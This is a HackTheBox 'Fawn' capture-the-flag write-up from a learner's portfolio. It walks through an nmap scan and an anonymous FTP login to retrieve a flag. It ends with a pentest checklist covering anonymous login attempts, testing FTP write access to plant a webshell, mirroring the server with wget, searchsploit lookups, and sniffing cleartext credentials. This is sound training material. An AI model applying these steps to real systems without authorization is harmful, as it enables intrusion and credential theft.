# HackTheBox — Fawn
**Platform:** HackTheBox — Starting Point, Tier 0  
**Date:** April 2026  
**Difficulty:** Very Easy  
**Concept:** FTP enumeration, anonymous authentication, file retrieval  

---

## Objective

Gain access to the target machine via FTP and retrieve the flag. Building on Meow's methodology — enumerate first, identify the service, understand the protocol, find the weakness.

---

## Concepts Tested

- What FTP is and how it works
- Service version detection with nmap
- Anonymous FTP authentication
- Navigating FTP from the command line and retrieving files

---

## Background — What is FTP?

Looked this one up before touching the machine. FTP (File Transfer Protocol) is a standard protocol for transferring files between a client and server over a network. It uses two separate connections — one for control (commands) and one for data (file transfers) — and authenticates users with a username and password sent in plaintext.

That last part is the critical security detail: **FTP transmits credentials in cleartext**. Anyone with a packet capture between the client and server can read the login and everything transferred. For secure file transfer, FTP is replaced by SFTP (SSH File Transfer Protocol) or FTPS (FTP over TLS/SSL).

Servers can also be configured to allow **anonymous authentication** — meaning anyone can log in without valid credentials using a generic username like `anonymous`. This is a legitimate feature for public file distribution but a significant misconfiguration on anything that should be private.

---

## Methodology

### Step 1 — Verify connectivity

```bash
ping [target IP]
```

Host is live. Same first step as every machine — confirm reachability before scanning.

### Step 2 — Initial port scan

```bash
sudo nmap [target IP]
```

Port 21/tcp open — FTP. Only one port, one attack surface.

### Step 3 — Version detection

```bash
sudo nmap -sV [target IP]
```

Output:
```
21/tcp open  ftp  vsftpd 3.0.3
```

`-sV` pulls the service version — vsftpd 3.0.3. Version information matters because it narrows the search for known CVEs and default configurations. vsftpd is a common Unix FTP server. Worth noting for future reference: vsftpd 2.3.4 has a famous backdoor vulnerability — not this version, but knowing the history helps.

### Step 4 — Install FTP client and check usage

```bash
sudo apt install ftp -y
ftp -?
```

Kali didn't have the FTP client installed by default. Checked the usage flags to confirm syntax before connecting.

### Step 5 — Connect and attempt anonymous login

```bash
ftp [target IP]
```

Prompted for a username and password:

```
Name: anonymous
Password: anon123
```

Logged in. Anonymous authentication was enabled on this server — no valid credentials required. Any username/password combination would have worked here, but `anonymous` is the standard username to try first on FTP.

### Step 6 — Enumerate and retrieve the flag

```bash
ftp> ls
```

```
flag.txt
```

```bash
ftp> get flag.txt
ftp> bye
```

`get` downloads the file to the local machine. `bye` closes the FTP session cleanly.

### Step 7 — Read the flag

```bash
ls
cat flag.txt
```

Flag retrieved. Machine complete.

---

## Commands Used

| Command | Purpose |
|---------|---------|
| `ping [IP]` | Verify host is live |
| `sudo nmap [IP]` | Identify open ports |
| `sudo nmap -sV [IP]` | Detect service version |
| `sudo apt install ftp -y` | Install FTP client |
| `ftp [IP]` | Connect to FTP service |
| `ls` | List files in FTP directory |
| `get flag.txt` | Download file from FTP server |
| `bye` | Close FTP session |
| `cat flag.txt` | Read the flag |

---

## What I Tried First

Looked up FTP before connecting — understanding the protocol before touching it is becoming a consistent habit. Knowing that anonymous authentication is a real FTP feature (not just a CTF trick) made the credential choice obvious rather than a guess. Tried `anonymous` with a throwaway password — logged straight in.

The `ftp -?` step was deliberate. New tool, unfamiliar syntax — checking usage before running it is faster than troubleshooting a wrong command mid-session.

---

## Real-World Pentest Application

**Anonymous FTP is a legitimate finding on real targets.** It appears frequently on internal networks, NAS devices, network printers, and older infrastructure that was configured permissively and never reviewed. During a real engagement, finding anonymous FTP open is an immediate flag — even if the accessible files seem benign, they often contain internal documentation, configuration files, backup data, or credentials that advance the engagement significantly.

**FTP version matters.** vsftpd, ProFTPD, and FileZilla Server all have version-specific vulnerabilities worth knowing:

```bash
# Search for FTP exploits by version
searchsploit vsftpd
searchsploit proftpd
```

**FTP transmits in cleartext** — credentials and file contents are visible to anyone on the same network segment. On an internal engagement, running Wireshark or tcpdump while FTP traffic flows will capture logins in plaintext. This is why finding FTP open on a network is both a configuration finding and a potential credential harvesting opportunity.

**Checklist for any FTP service found during enumeration:**

```bash
# Always try anonymous first
ftp [IP]
# Username: anonymous  Password: anonymous (or blank)

# Check what's accessible
ftp> ls -la
ftp> pwd
ftp> cd [directory]

# Try uploading — write access = potential webshell if FTP root is web root
ftp> put test.txt

# Download everything accessible for offline review
wget -r ftp://[IP]/
```

Write access to an FTP server whose root overlaps with the web root is a direct path to deploying a webshell — a finding that goes from file access to remote code execution in one step.

---

## Key Takeaway

Anonymous FTP is a real misconfiguration that appears in production environments. Version detection with `-sV` is what makes nmap output actionable rather than just a list of open ports — knowing the software and version is what enables targeted exploitation and CVE research. Get in the habit of always running `-sV`.

**Next:** [Dancing](./dancing.md)

---

*Part of the [Offensive Security Portfolio](../../README.md) — HackTheBox Starting Point*
